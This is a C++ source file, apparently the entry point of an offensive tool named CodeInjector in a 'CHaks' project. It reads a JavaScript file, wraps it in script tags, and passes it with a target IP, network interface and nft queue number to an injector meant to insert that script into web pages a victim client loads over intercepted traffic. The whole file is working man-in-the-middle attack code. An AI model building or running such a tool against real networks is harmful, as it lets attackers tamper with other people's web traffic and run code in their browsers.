#include "CodeInjector.h"

#include <iostream>
#include <fstream>
#include <cstring>
#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>


void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <queueNum> <target ip> <url> <pathToContent> \n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<queueNum>: nft queue number used to capture packets\n"
        << "<target ip>: target client\n"
        << "<url>: webpage you want to inject code in\n"
        << "<pathToContent>: file path to the js content you wish to inject into the packet, should be a javascript file\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " 0 "  << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, uint32_t& queueNum, char* targetIP, char* url, 
    char* pathToContent)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 7)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    queueNum = atoi(argv[3]);

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[4]);
    PacketCraft::CopyStr(url, FQDN_MAX_STR_LEN, argv[5]);
    PacketCraft::CopyStr(pathToContent, PATH_MAX_SIZE, argv[6]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    uint32_t queueNum{};
    char targetIPStr[INET6_ADDRSTRLEN]{};
    char url[FQDN_MAX_STR_LEN]{};
    char pathToContent[PATH_MAX_SIZE]{};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, queueNum, targetIPStr, url, pathToContent) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    }

    std::ifstream file;
    file.open(pathToContent, std::ifstream::binary);
    if(!file.is_open())
    {
        LOG_ERROR(APPLICATION_ERROR, "failed to open js file");
        return APPLICATION_ERROR;
    }

    file.seekg (0, file.end);
    int jsLength = file.tellg();
    file.seekg (0, file.beg);

    const char* codePrefix = "<script>";
    const char* codeSuffix = "</script>";

    int totalCodeLen = jsLength + PacketCraft::GetStrLen(codePrefix) + PacketCraft::GetStrLen(codeSuffix);

    char* codeBuffer = (char*)malloc(totalCodeLen + 1);
    memcpy(codeBuffer, codePrefix, PacketCraft::GetStrLen(codePrefix));
    file.read(codeBuffer + PacketCraft::GetStrLen(codePrefix), jsLength);
    memcpy(codeBuffer + PacketCraft::GetStrLen(codePrefix) + jsLength, codeSuffix, PacketCraft::GetStrLen(codeSuffix) + 1);

    file.close();

    CHaks::CodeInjector codeInjector;
    if(codeInjector.Init(ipVersion, interfaceName, targetIPStr, queueNum, url, codeBuffer, totalCodeLen) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
        free(codeBuffer);
        return APPLICATION_ERROR;
    }

    std::cout << "running... press enter to stop\n";
    if(codeInjector.Run() == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        free(codeBuffer);
        return APPLICATION_ERROR;
    }

    free(codeBuffer);
    std::cout << std::flush;
    return NO_ERROR;    
}